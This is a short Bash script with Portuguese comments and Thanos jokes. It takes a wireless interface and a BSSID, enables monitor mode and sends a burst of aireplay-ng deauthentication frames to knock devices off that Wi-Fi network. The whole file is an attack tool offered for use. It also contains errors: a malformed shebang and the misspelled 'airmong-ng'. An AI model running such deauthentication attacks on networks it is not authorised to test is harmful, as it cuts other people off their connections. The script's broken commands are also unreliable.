#/bin/bash

# Inicia airmong-ng
sudo airmong-ng start $2

# Eu sou inevitavel
estalo (){

	#sudo airmong-ng start $placaRede
	sudo aireplay-ng --deauth 50 -b $3 $2 # Aumentar valor deauth

}
# Eu sou o Homem de Ferro

if [ "$1" == "--matarUniverso" ]; then
	estalo $2 $3
else
	echo "Use ./manopla.sh --matarUniverso placa_de_rede bssid_da_rede"
fi
